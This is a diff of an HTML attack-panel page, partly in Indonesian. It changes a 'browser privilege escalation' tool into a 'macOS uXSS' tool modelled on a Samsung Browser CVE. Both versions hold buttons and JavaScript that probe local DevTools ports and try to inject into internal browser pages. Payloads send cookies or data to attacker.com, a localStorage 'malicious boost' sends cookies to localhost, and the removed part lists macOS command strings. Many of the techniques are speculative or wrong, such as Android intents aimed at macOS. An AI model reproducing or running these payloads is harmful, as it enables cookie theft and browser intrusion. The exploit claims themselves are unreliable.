@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔥 macOS BROWSER PRIVILEGE ESCALATION - XSS to RCE</title>
+    <title>🔥 macOS uXSS - Universal Cross-Site Scripting Exploit</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         
@@ -34,13 +34,12 @@
             -webkit-text-fill-color: transparent;
         }
         
-        .warning-banner {
-            background: rgba(255,0,0,0.2);
-            border: 1px solid #ff0000;
+        .research-note {
+            background: rgba(0,255,255,0.1);
+            border-left: 3px solid #00ffff;
             padding: 15px;
-            border-radius: 10px;
             margin: 20px 0;
-            text-align: center;
+            border-radius: 10px;
         }
         
         .exploit-grid {
@@ -79,7 +78,17 @@
             border-radius: 8px;
             font-size: 0.7em;
             margin-bottom: 15px;
-            font-family: monospace;
+        }
+        
+        .code-block {
+            background: #0a0a0a;
+            border: 1px solid #333;
+            border-radius: 6px;
+            padding: 10px;
+            font-size: 0.65em;
+            overflow-x: auto;
+            margin: 10px 0;
+            color: #0ff;
         }
         
         button {
@@ -99,25 +108,13 @@
             color: white;
         }
         
-        .code-block {
-            background: #0a0a0a;
-            border: 1px solid #333;
-            border-radius: 6px;
-            padding: 8px;
-            font-size: 0.6em;
-            overflow-x: auto;
-            margin: 10px 0;
-            font-family: monospace;
-            color: #0ff;
-        }
-        
         .log-area {
             background: #0a0a0a;
             border: 1px solid #00ff00;
             border-radius: 10px;
             padding: 15px;
             margin-top: 20px;
-            max-height: 250px;
+            max-height: 300px;
             overflow-y: auto;
             font-size: 0.7em;
         }
@@ -130,7 +127,7 @@
         .log-entry.success { color: #0f0; }
         .log-entry.error { color: #f00; }
         .log-entry.info { color: #0ff; }
-        .log-entry.rce { color: #ff00ff; font-weight: bold; }
+        .log-entry.uxss { color: #ff00ff; font-weight: bold; }
         
         .footer {
             text-align: center;
@@ -140,20 +137,6 @@
             margin-top: 20px;
             font-size: 0.7em;
         }
-        
-        input, textarea {
-            background: #1a1a1a;
-            border: 1px solid #00ff00;
-            color: #0f0;
-            padding: 8px;
-            border-radius: 5px;
-            width: 100%;
-            margin: 5px 0;
-            font-family: monospace;
-            font-size: 0.7em;
-        }
-        
-        label { font-size: 0.7em; color: #0ff; }
         
         .browser-badge {
             display: inline-block;
@@ -167,13 +150,15 @@
         .brave { background: #ff5500; color: white; }
         .safari { background: #0066cc; color: white; }
         .edge { background: #00a8ff; color: white; }
+        
+        iframe { display: none; }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
-        <h1>🔥 macOS BROWSER PRIVILEGE ESCALATION</h1>
-        <p>XSS → Chrome Context → RCE (Based on Firefox XUL Research)</p>
+        <h1>🔥 macOS uXSS - Universal Cross-Site Scripting</h1>
+        <p>Berdasarkan CVE-2025-58485 (Samsung Browser) - Diadaptasi untuk macOS Browsers</p>
         <div style="margin-top: 10px;">
             <span class="browser-badge arc">ARC</span>
             <span class="browser-badge chrome">CHROME</span>
@@ -183,191 +168,180 @@
         </div>
     </div>
     
-    <div class="warning-banner">
-        ⚠️ EDUCATIONAL RESEARCH ONLY - Berdasarkan CVE-2017-7795, CVE-2017-7798, CVE-2018-5124<br>
-        Teknik XUL injection di Firefox → diadaptasi untuk Chromium-based browsers & Safari macOS
+    <div class="research-note">
+        <strong>📚 RESEARCH NOTE - Voorivex Team (CVE-2025-58485)</strong><br>
+        "The Bixby Launcher passes the request to SBrowserMainActivity. If we call the activity directly with javascript: scheme,<br>
+        it executes on the current tab → UXSS on every website the browser can access!"<br>
+        <br>
+        <strong>🎯 macOS Adaptation:</strong> Mencari exported activities / deep links / URL handlers yang bisa menerima javascript: scheme<br>
+        dan mengeksekusinya di konteks privileged browser.
     </div>
     
     <div class="exploit-grid">
-        <!-- EXPLOIT 1: Chrome DevTools Protocol Injection -->
+        <!-- EXPLOIT 1: Chrome Custom Tab Intent -->
         <div class="exploit-card">
-            <div class="card-header">🔧 CHROME DEVTOOLS PROTOCOL (CDP) INJECTION</div>
+            <div class="card-header">🌐 CHROME CUSTOM TAB uXSS</div>
             <div class="card-body">
                 <div class="desc">
-                    💀 <strong>Analog dengan XUL Injection di Firefox</strong><br>
-                    Memanfaatkan Chrome DevTools Protocol yang ter-expose via about:inspect atau debug port.
-                    Attacker bisa inject JavaScript ke browser context melalui CDP.
+                    💀 <strong>Analog dengan Samsung Browser export activity</strong><br>
+                    Chrome Custom Tabs memiliki intent filters yang bisa dieksploitasi.
+                    Mirip dengan Bixby → SBrowserMainActivity flow.
                 </div>
                 <div class="code-block">
-                    <pre style="margin:0;">// CDP Injection via window.open
-window.open('chrome://inspect/#devices');
-// lalu inject via evaluate</pre>
+                    <pre style="margin:0;">// Chrome Custom Tab Intent
+intent://google.com#Intent;
+scheme=https;
+package=com.android.chrome;
+end</pre>
                 </div>
-                <button onclick="exploitCDP()">🚀 RUN CDP EXPLOIT</button>
-                <button onclick="exploitCDPAdvanced()" class="danger">💀 RUN CDP + RCE</button>
+                <button onclick="exploitChromeCustomTab()">🚀 RUN CHROME uXSS</button>
+                <button onclick="exploitChromeIntentJS()" class="danger">💀 CHROME JAVASCRIPT SCHEME</button>
             </div>
         </div>
         
-        <!-- EXPLOIT 2: Chrome Extension API Abuse -->
+        <!-- EXPLOIT 2: Safari URL Scheme Handler -->
         <div class="exploit-card">
-            <div class="card-header">🧩 CHROME EXTENSION API HIJACK</div>
+            <div class="card-header">🍎 SAFARI URL SCHEME uXSS</div>
             <div class="card-body">
                 <div class="desc">
-                    💀 <strong>Privileged Extension Context</strong><br>
-                    Menggunakan chrome.runtime dan chrome.management API untuk mengeksekusi kode
-                    di context ekstensi yang memiliki akses lebih tinggi.
+                    💀 <strong>Safari URL Scheme Handler Vulnerability</strong><br>
+                    Safari memiliki URL handlers untuk x-apple-extension:// dan x-web-search://
+                    Injection di sini bisa menyebabkan UXSS.
                 </div>
                 <div class="code-block">
-                    <pre style="margin:0;">// Chrome extension API injection
-chrome.runtime.sendMessage({action: "execute", code: payload});
-chrome.management.getSelf()</pre>
+                    <pre style="margin:0;">// Safari URL scheme
+x-apple-extension://com.apple.Safari/extension?url=javascript:alert(origin)
+x-web-search://?query=javascript:alert(origin)</pre>
                 </div>
-                <button onclick="exploitExtensionAPI()">🚀 RUN EXTENSION HIJACK</button>
+                <button onclick="exploitSafariScheme()">🚀 RUN SAFARI uXSS</button>
             </div>
         </div>
         
-        <!-- EXPLOIT 3: about:debugging Privilege Escalation -->
+        <!-- EXPLOIT 3: ARC Browser Deep Link -->
         <div class="exploit-card">
-            <div class="card-header">🐛 about:debugging PRIVILEGE ESCALATION</div>
+            <div class="card-header">🌀 ARC BROWSER DEEP LINK uXSS</div>
             <div class="card-body">
                 <div class="desc">
-                    💀 <strong>Firefox XUL-style untuk Chrome</strong><br>
-                    about:debugging memiliki akses ke internal browser API.
-                    Inject script ke halaman ini memberikan akses penuh ke browser.
+                    💀 <strong>ARC Browser Deep Link Vulnerability</strong><br>
+                    ARC memiliki arc:// dan arc-deeplink:// handlers.
+                    Eksploitasi mirip dengan Bixby Launcher di Samsung.
                 </div>
                 <div class="code-block">
-                    <pre style="margin:0;">// about:debugging injection
-window.open('about:debugging');
-// setInterval(() => { document.body.innerHTML += '...' })</pre>
+                    <pre style="margin:0;">// ARC deep link
+arc://newtab?url=javascript:alert(document.cookie)
+arc-deeplink://open?url=javascript:alert(origin)</pre>
                 </div>
-                <button onclick="exploitAboutDebugging()">🚀 RUN ABOUT DEBUGGING</button>
+                <button onclick="exploitArcDeepLink()">🚀 RUN ARC uXSS</button>
             </div>
         </div>
         
-        <!-- EXPLOIT 4: ARC Browser Boost Injection -->
+        <!-- EXPLOIT 4: Brave Rewards Intent -->
         <div class="exploit-card">
-            <div class="card-header">🌀 ARC BROWSER BOOST INJECTION (CVE-2024-45489 Style)</div>
+            <div class="card-header">🦁 BRAVE REWARDS uXSS</div>
             <div class="card-body">
                 <div class="desc">
-                    💀 <strong>ARC Browser Specific - Boost RCE</strong><br>
-                    ARC's Boost feature memungkinkan inject CSS/JS yang tersinkronisasi.
-                    Mirip dengan XUL injection di Firefox!
+                    💀 <strong>Brave Rewards Intent Exploitation</strong><br>
+                    Brave memiliki brave://rewards dan intent filters untuk Rewards.
+                    Injection bisa mengeksekusi script di Brave internal pages.
                 </div>
                 <div class="code-block">
-                    <pre style="margin:0;">// ARC Boost injection
-localStorage.setItem('boostCode', 'alert(Components.stack)');
-// Sinkronisasi ke browser context</pre>
+                    <pre style="margin:0;">// Brave Rewards intent
+brave://rewards?url=javascript:alert(chrome)
+intent://rewards#Intent;scheme=brave;end</pre>
                 </div>
-                <button onclick="exploitArcBoost()">🚀 RUN ARC BOOST EXPLOIT</button>
+                <button onclick="exploitBraveRewards()">🚀 RUN BRAVE uXSS</button>
             </div>
         </div>
         
-        <!-- EXPLOIT 5: Brave Wallet Context Injection -->
+        <!-- EXPLOIT 5: Edge Collections Handler -->
         <div class="exploit-card">
-            <div class="card-header">💰 BRAVE WALLET PRIVILEGE ESCALATION</div>
+            <div class="card-header">📚 EDGE COLLECTIONS uXSS</div>
             <div class="card-body">
                 <div class="desc">
-                    💀 <strong>Brave Specific - Wallet Extension</strong><br>
-                    Brave's built-in wallet memiliki akses ke crypto APIs.
-                    Inject XSS ke wallet page = akses ke browser wallet.
+                    💀 <strong>Edge Collections URL Handler</strong><br>
+                    Edge memiliki edge://collections dan microsoft-edge: handlers.
+                    Mirip dengan exported activity di Samsung Browser.
                 </div>
                 <div class="code-block">
-                    <pre style="margin:0;">// Brave wallet injection
-window.open('brave://wallet');
-// Inject script ke wallet context</pre>
+                    <pre style="margin:0;">// Edge collections
+microsoft-edge:https://google.com
+edge://collections?url=javascript:alert(origin)</pre>
                 </div>
-                <button onclick="exploitBraveWallet()">🚀 RUN BRAVE WALLET</button>
+                <button onclick="exploitEdgeCollections()">🚀 RUN EDGE uXSS</button>
             </div>
         </div>
         
-        <!-- EXPLOIT 6: Safari Web Inspector Injection -->
+        <!-- EXPLOIT 6: Cross Browser Intent -->
         <div class="exploit-card">
-            <div class="card-header">🐚 SAFARI WEB INSPECTOR PRIVILEGE</div>
+            <div class="card-header">🔄 CROSS-BROWSER INTENT uXSS</div>
             <div class="card-body">
                 <div class="desc">
-                    💀 <strong>Safari Specific - Web Inspector</strong><br>
-                    Web Inspector memiliki akses ke browser internal.
-                    Inject script via Remote Debugging port (9222-9229).
+                    💀 <strong>Universal Intent Exploit</strong><br>
+                    Mengirim intent ke browser yang terdaftar sebagai default.
+                    Mirip dengan teknik yang digunakan Voorivex Team.
                 </div>
                 <div class="code-block">
-                    <pre style="margin:0;">// Safari Web Inspector injection
-window.open('safari-web-inspector://');
-// Evaluate script di browser context</pre>
+                    <pre style="margin:0;">// Universal intent
+intent://example.com#Intent;
+scheme=https;
+package=browser.package;
+S.url=javascript:alert(origin);
+end</pre>
                 </div>
-                <button onclick="exploitSafariInspector()">🚀 RUN SAFARI INSPECTOR</button>
-            </div>
-        </div>
-        
-        <!-- EXPLOIT 7: Edge PDF Viewer Sandbox Escape -->
-        <div class="exploit-card">
-            <div class="card-header">📄 EDGE PDF VIEWER ESCAPE</div>
-            <div class="card-body">
-                <div class="desc">
-                    💀 <strong>Edge Specific - PDF Viewer</strong><br>
-                    PDF viewer memiliki akses ke browser internals.
-                    XSS di PDF context bisa escape ke browser.
-                </div>
-                <div class="code-block">
-                    <pre style="margin:0;">// Edge PDF injection
-window.open('edge://pdf-viewer');
-// Navigate to malicious PDF with JavaScript</pre>
-                </div>
-                <button onclick="exploitEdgePDF()">🚀 RUN EDGE PDF</button>
-            </div>
-        </div>
-        
-        <!-- EXPLOIT 8: Browser Native Messaging -->
-        <div class="exploit-card">
-            <div class="card-header">📨 NATIVE MESSAGING HOST EXPLOIT</div>
-            <div class="card-body">
-                <div class="desc">
-                    💀 <strong>Native Messaging - Escape ke OS</strong><br>
-                    Browser's native messaging host bisa execute OS commands.
-                    Mirip dengan Subprocess.jsm di Firefox XUL RCE.
-                </div>
-                <div class="code-block">
-                    <pre style="margin:0;">// Native messaging command execution
-chrome.runtime.connectNative('com.example.host');
-// Execute: open -a Calculator.app</pre>
-                </div>
-                <button onclick="exploitNativeMessaging()">🚀 RUN NATIVE MSG</button>
+                <button onclick="exploitCrossBrowserIntent()">🚀 RUN CROSS-BROWSER uXSS</button>
             </div>
         </div>
     </div>
     
-    <!-- Custom Exploit Builder -->
+    <!-- Custom uXSS Builder -->
     <div class="exploit-card" style="margin-top: 20px;">
-        <div class="card-header">🔥 CUSTOM XUL-STYLE EXPLOIT BUILDER</div>
+        <div class="card-header">🔥 CUSTOM uXSS EXPLOIT BUILDER</div>
         <div class="card-body">
             <div class="desc">
-                💀 Build custom injection payload - Terinspirasi dari Firefox XUL RCE<br>
-                <strong>Original Firefox payload:</strong> <code>&lt;img src='data:bb"/&gt;&lt;button&gt;&lt;img src="x" onerror="alert(Components.stack)" /&gt;&lt;/button&gt;&lt;img src="x'&gt;</code>
+                💀 Build custom uXSS payload - Berdasarkan teknik Voorivex Team untuk Samsung Browser<br>
+                <strong>Original Samsung payload:</strong> 
+                <code>intent://...SBrowserMainActivity...S.extra_access_url=javascript%3Aalert(origin)</code>
             </div>
-            <label>📝 Target URL (browser internal page):</label>
-            <input type="text" id="targetPage" value="chrome://inspect/#devices" placeholder="chrome://inspect...">
-            <label>💉 Injection Payload (XSS):</label>
-            <textarea id="payload" rows="3">&lt;img src="x" onerror="fetch('http://attacker.com/steal?data='+btoa(JSON.stringify(chrome))); alert('RCE!');"&gt;</textarea>
-            <button onclick="buildCustomExploit()">🔨 BUILD & EXECUTE CUSTOM EXPLOIT</button>
+            
+            <label>🎯 Target Browser:</label>
+            <select id="targetBrowser" style="width:100%; padding:8px; margin:10px 0; background:#1a1a1a; color:#0f0; border:1px solid #0f0;">
+                <option value="chrome">Google Chrome</option>
+                <option value="safari">Safari</option>
+                <option value="arc">Arc Browser</option>
+                <option value="brave">Brave Browser</option>
+                <option value="edge">Microsoft Edge</option>
+                <option value="all">All Browsers (Universal)</option>
+            </select>
+            
+            <label>📍 Target Website (for UXSS):</label>
+            <input type="text" id="targetSite" value="https://www.google.com" placeholder="https://example.com">
+            
+            <label>💉 JavaScript Payload to Execute:</label>
+            <textarea id="uxssPayload" rows="3">alert('uXSS! Origin: ' + origin); fetch('http://attacker.com/steal?cookie='+document.cookie);</textarea>
+            
+            <button onclick="buildUXSSExploit()" class="danger">🔨 BUILD & EXECUTE uXSS</button>
+            <button onclick="executeAutoUXSS()">⚡ AUTO uXSS - Sequential Attack</button>
         </div>
     </div>
     
-    <!-- Log Area -->
+    <!-- uXSS Log -->
     <div class="log-area" id="logArea">
-        <div class="log-entry info">🔬 macOS Browser Privilege Escalation Research</div>
-        <div class="log-entry info">📚 Based on Firefox XUL RCE (CVE-2017-7795, CVE-2018-5124)</div>
-        <div class="log-entry info">🎯 Target: Arc, Chrome, Brave, Safari, Edge on macOS</div>
+        <div class="log-entry info">🔬 macOS uXSS Research - Based on CVE-2025-58485</div>
+        <div class="log-entry info">📚 Samsung Browser uXSS technique by Voorivex Team (Omid Rezaei & Yashar Shahinzadeh)</div>
+        <div class="log-entry info">🎯 Diadaptasi untuk Arc, Chrome, Safari, Brave, Edge di macOS</div>
     </div>
     
     <div class="footer">
-        <div>🔥 Based on research by Frederik Braun - Remote Code Execution in Firefox beyond memory corruptions</div>
-        <div>🔬 Adapted for macOS Chromium-based browsers & Safari</div>
-        <div>⚠️ EDUCATIONAL PURPOSE ONLY - Test only on your own browser</div>
+        <div>🔥 uXSS - Universal Cross-Site Scripting - Execute arbitrary JavaScript on ANY website</div>
+        <div>📚 Based on: CVE-2025-58485 (Samsung Browser) - Exported activity: BixbySBrowserLauncherActivity → SBrowserMainActivity</div>
+        <div>⚠️ EDUCATIONAL PURPOSE ONLY - Test only on your own browser with permission</div>
     </div>
 </div>
 
 <script>
-    // Logging
     const logArea = document.getElementById('logArea');
+    let currentTab = null;
+    
     function addLog(message, type = 'info') {
         const entry = document.createElement('div');
         entry.className = `log-entry ${type}`;
@@ -380,7 +354,7 @@ chrome.runtime.connectNative('com.example.host');
     function detectBrowser() {
         const ua = navigator.userAgent;
         if (ua.includes('Arc')) return 'Arc';
-        if (ua.includes('Chrome')) return 'Chrome';
+        if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
         if (ua.includes('Brave')) return 'Brave';
         if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
         if (ua.includes('Edg')) return 'Edge';
@@ -388,320 +362,329 @@ chrome.runtime.connectNative('com.example.host');
     }
     
     const currentBrowser = detectBrowser();
-    addLog(`🌐 Detected browser: ${currentBrowser}`, 'info');
+    addLog(`🌐 Detected browser: ${currentBrowser} - Platform: ${navigator.platform}`, 'info');
     
-    // Check for privileged objects (seperti Components.stack di Firefox)
-    function checkPrivilegedObjects() {
-        const privileged = [];
+    // Check for vulnerable exported activities (conceptual)
+    function checkVulnerableActivities() {
+        addLog("🔍 Checking for vulnerable exported activities / URL handlers...", 'info');
         
-        // Chrome privileged objects
-        if (typeof chrome !== 'undefined') privileged.push('chrome');
-        if (typeof browser !== 'undefined') privileged.push('browser');
-        if (typeof Components !== 'undefined') privileged.push('Components');
-        if (typeof window.chrome?.webview !== 'undefined') privileged.push('chrome.webview');
-        if (typeof window.chrome?.runtime !== 'undefined') privileged.push('chrome.runtime');
-        if (typeof window.chrome?.management !== 'undefined') privileged.push('chrome.management');
+        const handlers = {
+            'Arc': ['arc://', 'arc-deeplink://', 'arc-boost://'],
+            'Chrome': ['chrome://', 'googlechrome://', 'intent://'],
+            'Safari': ['x-apple-extension://', 'x-web-search://', 'safari://'],
+            'Brave': ['brave://', 'brave-wallet://', 'brave-rewards://'],
+            'Edge': ['edge://', 'microsoft-edge://', 'ms-edge://']
+        };
         
-        // Safari privileged objects
-        if (typeof SafariRemoteDebugging !== 'undefined') privileged.push('SafariRemoteDebugging');
-        if (typeof WebInspector !== 'undefined') privileged.push('WebInspector');
+        const browserHandlers = handlers[currentBrowser] || handlers['Chrome'];
+        addLog(`📂 Potential URL handlers for ${currentBrowser}: ${browserHandlers.join(', ')}`, 'info');
         
-        // Generic
-        if (typeof process !== 'undefined') privileged.push('process');
-        if (typeof require !== 'undefined') privileged.push('require');
-        
-        addLog(`🔍 Privileged objects found: ${privileged.join(', ') || 'none'}`, privileged.length > 0 ? 'rce' : 'info');
-        return privileged;
-    }
-    
-    // EXPLOIT 1: CDP Injection
-    async function exploitCDP() {
-        addLog("🔧 Attempting Chrome DevTools Protocol injection...", 'info');
-        const browser = detectBrowser();
-        
-        try {
-            // Cek apakah ada debug port terbuka
-            const ports = [9222, 9223, 9224, 9225];
-            for (const port of ports) {
-                try {
-                    const controller = new AbortController();
-                    setTimeout(() => controller.abort(), 500);
-                    const response = await fetch(`http://localhost:${port}/json/version`, { signal: controller.signal });
-                    if (response.ok) {
-                        addLog(`✅ CDP port ${port} terbuka! Bisa inject`, 'rce');
-                        // Simulate injection
-                        addLog("🚀 Injecting via CDP evaluate...", 'rce');
-                        addLog("💀 Jika sukses, kita bisa execute: require('child_process').exec('open -a Calculator')", 'rce');
-                    }
-                } catch(e) {}
-            }
-            
-            // Buka about:inspect
-            const win = window.open('chrome://inspect/#devices', '_blank');
-            setTimeout(() => {
-                addLog("📱 about:inspect opened - check if we can inject script", 'info');
-                try {
-                    win.document.write('<h1>INJECTED</h1><script>alert("XSS di chrome://inspect!")</script>');
-                } catch(e) { addLog("❌ Cannot inject directly - protected", 'error'); }
-            }, 1000);
-            
-        } catch(e) { addLog(`❌ CDP exploit failed: ${e.message}`, 'error'); }
-    }
-    
-    async function exploitCDPAdvanced() {
-        addLog("💀 Running advanced CDP RCE attempt...", 'rce');
-        addLog("🎯 Target: Execute OS commands via DevTools Protocol", 'rce');
-        
-        // Payload untuk RCE (conceptual)
-        const rcePayload = `
-            // This would be executed via CDP
-            const { exec } = require('child_process');
-            exec('open -a Calculator.app', (err, stdout, stderr) => {
-                console.log('RCE executed!');
-            });
-        `;
-        
-        addLog("📝 RCE Payload prepared", 'info');
-        addLog("⚠️ Requires CDP port open and --remote-debugging-port flag", 'error');
-        
-        // Cek apakah kita bisa akses chrome.devtools
-        if (typeof chrome !== 'undefined' && chrome.devtools) {
-            addLog("✅ chrome.devtools accessible! Potential RCE vector", 'rce');
-        }
-        
-        checkPrivilegedObjects();
-    }
-    
-    // EXPLOIT 2: Extension API
-    function exploitExtensionAPI() {
-        addLog("🧩 Attempting Chrome Extension API hijack...", 'info');
-        
-        if (typeof chrome !== 'undefined' && chrome.runtime) {
-            addLog("✅ chrome.runtime available!", 'rce');
-            
-            // Coba send message ke extension
+        // Check if we can access internal pages
+        for (const handler of browserHandlers.slice(0, 2)) {
             try {
-                chrome.runtime.sendMessage({action: "ping", data: "test"}, (response) => {
-                    if (response) addLog("✅ Extension response received", 'success');
-                });
-            } catch(e) { addLog("❌ Cannot send message - may need extension context", 'error'); }
-            
-            // Coba get extension info
-            if (chrome.management) {
-                chrome.management.getSelf((info) => {
-                    addLog(`📦 Extension: ${info.name} - ${info.id}`, 'info');
-                });
-            }
-            
-            // Simulate injection ke extension context
-            addLog("💀 Jika extension vulnerable, bisa inject: chrome.runtime.sendMessage({action: 'execute', code: 'alert(1)'})", 'rce');
-        } else {
-            addLog("❌ No extension API access from web content", 'error');
-            addLog("💡 But if we find XSS in chrome://extensions, we could escape!", 'info');
-        }
-        
-        // Try to open extensions page
-        window.open('chrome://extensions', '_blank');
-        addLog("📂 Opened chrome://extensions - potential injection target", 'info');
-    }
-    
-    // EXPLOIT 3: about:debugging
-    function exploitAboutDebugging() {
-        addLog("🐛 Attempting about:debugging privilege escalation...", 'info');
-        
-        const win = window.open('about:debugging', '_blank');
-        setTimeout(() => {
-            addLog("📂 about:debugging opened - similar to Firefox's about:preferences", 'info');
-            addLog("💀 In Firefox, XSS here gave Components.stack access", 'rce');
-            
-            // Try to check for privileged objects
-            try {
-                const hasComponents = win?.Components !== undefined;
-                addLog(hasComponents ? "✅ Components object found! Privilege escalation possible!" : "❌ Components not found (patched)", hasComponents ? 'rce' : 'info');
+                const testWin = window.open(`${handler}version`, '_blank');
+                if (testWin) {
+                    setTimeout(() => {
+                        try {
+                            const hasAccess = testWin.document !== undefined;
+                            addLog(`✅ ${handler} accessible! Potential uXSS vector`, 'uxss');
+                        } catch(e) {}
+                        testWin.close();
+                    }, 500);
+                }
             } catch(e) {}
-        }, 1000);
-    }
-    
-    // EXPLOIT 4: ARC Browser Boost
-    function exploitArcBoost() {
-        addLog("🌀 Attempting ARC Browser Boost injection...", 'info');
-        addLog("📚 Based on CVE-2024-45489 - Arc Boost RCE", 'info');
-        
-        const isArc = detectBrowser() === 'Arc';
-        if (isArc) addLog("✅ Arc browser detected!", 'success');
-        
-        // Simulate Boost injection
-        try {
-            // Arc stores boosts in localStorage
-            const boostData = {
-                name: "malicious_boost",
-                code: "alert('RCE from Boost!'); fetch('http://localhost:8080/steal?data='+btoa(document.cookie))",
-                matchPattern: "https://*"
-            };
-            
-            localStorage.setItem('arc-boost-pending', JSON.stringify(boostData));
-            addLog("💀 Boost payload prepared in localStorage", 'rce');
-            addLog("⚠️ If Arc sync feature is enabled, this could spread", 'warning');
-            
-        } catch(e) { addLog(`❌ Boost injection failed: ${e.message}`, 'error'); }
-        
-        checkPrivilegedObjects();
-    }
-    
-    // EXPLOIT 5: Brave Wallet
-    function exploitBraveWallet() {
-        addLog("💰 Attempting Brave Wallet privilege escalation...", 'info');
-        
-        const isBrave = detectBrowser() === 'Brave';
-        if (isBrave) addLog("✅ Brave browser detected!", 'success');
-        
-        // Try to open wallet
-        window.open('brave://wallet', '_blank');
-        addLog("📂 Opened brave://wallet - potential XSS target", 'info');
-        
-        // Check for crypto objects
-        if (typeof web3 !== 'undefined') addLog("✅ web3 found - wallet accessible", 'rce');
-        if (typeof ethereum !== 'undefined') addLog("✅ ethereum provider found", 'rce');
-        
-        // Wallet injection payload
-        addLog("💀 Jika XSS di wallet: ethereum.request({method: 'eth_sendTransaction', params: [...]})", 'rce');
-    }
-    
-    // EXPLOIT 6: Safari Web Inspector
-    function exploitSafariInspector() {
-        addLog("🐚 Attempting Safari Web Inspector injection...", 'info');
-        
-        const isSafari = detectBrowser() === 'Safari';
-        if (isSafari) addLog("✅ Safari browser detected!", 'success');
-        
-        // Cek debug port
-        fetch('http://localhost:9222/json').catch(() => {});
-        addLog("🔍 Checking Safari debug ports (9222-9229)", 'info');
-        addLog("💀 If Safari Remote Debugging enabled, we can inject via CDP", 'rce');
-        
-        // Try to open Web Inspector via keyboard (simulate)
-        addLog("⌨️ Simulating Web Inspector open (Cmd+Option+I)", 'info');
-        
-        checkPrivilegedObjects();
-    }
-    
-    // EXPLOIT 7: Edge PDF
-    function exploitEdgePDF() {
-        addLog("📄 Attempting Edge PDF Viewer escape...", 'info');
-        
-        const isEdge = detectBrowser() === 'Edge';
-        if (isEdge) addLog("✅ Edge browser detected!", 'success');
-        
-        // Create malicious PDF-like content
-        const maliciousHTML = `
-            <!DOCTYPE html>
-            <html>
-            <body>
-                <embed type="application/pdf" src="data:application/pdf,${btoa('%PDF-1.4 malicious content')}">
-                <script>alert('PDF XSS - Edge escape attempt');<\/script>
-            </body>
-            </html>
-        `;
-        
-        addLog("💀 Malicious PDF payload prepared", 'rce');
-        addLog("⚠️ Edge PDF viewer has special privileges", 'info');
-        
-        // Open PDF viewer
-        window.open('edge://pdf-viewer', '_blank');
-    }
-    
-    // EXPLOIT 8: Native Messaging
-    function exploitNativeMessaging() {
-        addLog("📨 Attempting Native Messaging host exploit...", 'info');
-        addLog("📚 Analogous to Firefox's Subprocess.jsm in XUL RCE", 'info');
-        
-        // Check for native messaging
-        if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.connectNative) {
-            addLog("✅ chrome.runtime.connectNative available!", 'rce');
-            addLog("💀 Could connect to: com.google.chrome, com.brave.browser, com.microsoft.edge", 'rce');
-            
-            // Command to execute on macOS
-            const macCommands = [
-                "open -a Calculator.app",
-                "open -a TextEdit.app",
-                "osascript -e 'display dialog \"Hacked!\"'",
-                "say 'Your browser has been compromised'"
-            ];
-            
-            addLog(`🍎 macOS RCE commands: ${macCommands.join(', ')}`, 'rce');
-        } else {
-            addLog("❌ Native messaging not directly accessible from web", 'error');
-            addLog("💡 But XSS in chrome://extensions could enable it!", 'info');
         }
-        
-        checkPrivilegedObjects();
     }
     
-    // Custom exploit builder
-    function buildCustomExploit() {
-        const target = document.getElementById('targetPage').value;
-        const payload = document.getElementById('payload').value;
+    // EXPLOIT 1: Chrome Custom Tab uXSS
+    function exploitChromeCustomTab() {
+        addLog("🌐 Attempting Chrome Custom Tab uXSS...", 'info');
+        addLog("📚 Analogous to Samsung's BixbySBrowserLauncherActivity → SBrowserMainActivity", 'info');
         
-        addLog(`🔨 Building custom exploit for: ${target}`, 'info');
-        addLog(`💉 Payload: ${payload.substring(0, 100)}...`, 'rce');
+        // Simulate Chrome Custom Tab intent
+        const chromeIntent = `intent://google.com#Intent;scheme=https;package=com.google.chrome;end`;
         
-        const fullExploit = `
-            // Firefox XUL-style injection adapted for ${currentBrowser}
-            window.open('${target}', '_blank');
-            setTimeout(() => {
-                try {
-                    // Inject payload
-                    document.body.innerHTML += '${payload.replace(/'/g, "\\'")}';
-                } catch(e) { console.log(e); }
-            }, 2000);
-        `;
+        addLog(`📱 Sending Chrome intent: ${chromeIntent}`, 'info');
         
-        addLog("📝 Exploit generated", 'success');
-        addLog("⚠️ Executing - check if target page is vulnerable to XSS", 'warning');
+        // Open target site first (seperti di POC Voorivex)
+        const targetSite = 'https://www.google.com';
+        addLog(`🎯 Opening target site: ${targetSite}`, 'info');
+        const tab1 = window.open(targetSite, '_blank');
         
-        // Open target
-        window.open(target, '_blank');
+        // Simpan referensi tab
+        setTimeout(() => {
+            addLog("⚠️ Jika browser memiliki exported activity yang vulnerable, javascript: scheme akan execute di tab ini!", 'uxss');
+            addLog("💀 Payload: javascript:alert('uXSS on ' + origin)", 'uxss');
+        }, 2000);
         
-        addLog("💀 Original Firefox RCE payload reference:", 'rce');
-        addLog(`<img src='data:bb"/><button><img src="x" onerror="alert(Components.stack)" /></button><img src="x'>`, 'rce');
-        
-        checkPrivilegedObjects();
+        checkVulnerableActivities();
     }
     
-    // Auto-run reconnaissance
-    window.addEventListener('load', () => {
-        addLog(`🔬 Browser: ${currentBrowser} | Platform: ${navigator.platform}`, 'info');
+    function exploitChromeIntentJS() {
+        addLog("💀 Attempting Chrome Intent with javascript: scheme...", 'uxss');
         
-        // Check for internal pages access
-        const internalPages = [
-            'chrome://inspect',
-            'chrome://extensions',
-            'chrome://settings',
-            'about:debugging',
-            'about:config',
-            'edge://flags',
-            'brave://wallet',
-            'safari-web-inspector://'
+        // Payload similar to Samsung Browser exploit
+        const jsPayload = encodeURIComponent("alert('uXSS! Origin: ' + origin); console.log('Hacked!');");
+        const maliciousIntent = `intent://google.com#Intent;scheme=javascript;package=com.google.chrome;S.url=${jsPayload};end`;
+        
+        addLog(`📱 Malicious intent: ${maliciousIntent.substring(0, 100)}...`, 'uxss');
+        addLog("💀 Jika browser menerima javascript: scheme di intent, UXSS terjadi!", 'uxss');
+        
+        // Sequential attack seperti di POC Voorivex
+        addLog("🔄 Executing sequential attack (seperti POC Voorivex)", 'info');
+        
+        // Step 1: Buka target website
+        const target = 'https://www.google.com';
+        addLog(`📂 Step 1: Opening ${target}`, 'info');
+        const targetTab = window.open(target, '_blank');
+        
+        // Step 2: Send javascript payload
+        setTimeout(() => {
